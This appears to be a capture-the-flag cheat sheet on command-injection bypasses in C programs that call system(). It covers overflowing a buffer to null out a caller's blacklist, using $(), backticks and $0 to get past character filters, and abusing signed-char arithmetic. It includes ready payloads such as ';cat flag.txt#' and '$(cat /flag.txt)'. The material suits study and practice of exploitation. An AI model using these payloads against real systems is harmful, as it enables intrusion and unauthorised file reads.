# Command Injection

**When:** User input is passed to `system()`, `popen()`, `exec*()` with a shell, or similar. Even with filters, shell metacharacters can often bypass restrictions.

```c
sprintf(cmd, "echo %s", input);
system(cmd);
```

## Blacklist Bypass: Inter-Frame Overflow + Nulls

**How it works:** The blacklist resides in the _caller's_ stack frame. The input overflow (often combined with a large `read`/`fgets` into a small buffer) travels past the current frame into the caller, overwriting the blacklist data with benign bytes. Typically null bytes (`\x00`) are used for the overwrite, which simultaneously causes `strlen(input)` to return a small number so the check loop only scans the command portion.

```c
void echo(char* blacklist, int blacklist_len) {
    char input[100];
    fgets(input, 0x100, stdin);  // overflow reaches into main's blacklist
    // check: if any input[j] matches blacklist[i], die
    system("echo " + input);
}
```

```python
# input[0..n-1]: command injection    (no nulls, checked against blacklist)
# input[n..n+25]: 26 null bytes       (overwrites caller's blacklist)
# strlen(input) = n (stops at first \x00 at position n)
# Blacklist is all \x00 now — input[j] == 0x00 never matches → passes
# system("echo ;cat flag.txt#...") executes the injection
payload  = b";cat flag.txt#"
payload += b"A" * (144 - len(payload))  # pad to offset of blacklist
payload += b"\x00" * 25                  # zero out the blacklist
```

## Allowed Character Filter Bypass

**How it works:** If only `[a-zA-Z0-9 /.\0]` are allowed, use shell features that don't need banned chars.

```python
# $0 executes sh
payload = b"$0"

# $() for command substitution
payload = b"$(cat /flag.txt)"

# Backticks also work
payload = b"`cat /flag.txt`"
```

## Whitelist Bypass via Signed Char

**How it works:** Input is transformed to lowercase letters via modulo arithmetic on `char` (which may be signed). Bytes 0x80-0xFF are negative when signed, so `% 26` produces negative remainders, and adding `0x61` can produce arbitrary characters.

```c
for (int i = 0; i < strlen(input); i++) {
    if (input[i] == ' ') continue;
    input[i] = (input[i] % 26) + 0x61;  // char may be signed!
}
```

```python
# Find bytes that map to useful shell chars
useful = set()
for b in range(0x80, 0x100):
    result = ((b % 26) + 0x61) & 0xff
    if chr(result) in ';$|`':
        useful.add((hex(b), repr(chr(result))))
```

## General Tips

- `$()` and backticks work for command substitution without needing `;` or `|`
- Shell globbing (`*`, `?`) can read files without knowing exact paths
- `/` is sometimes allowed (paths), sometimes not (try `$(<flag.txt)`)
- Newlines (`%0a`, `\n`) can terminate the current command in some contexts
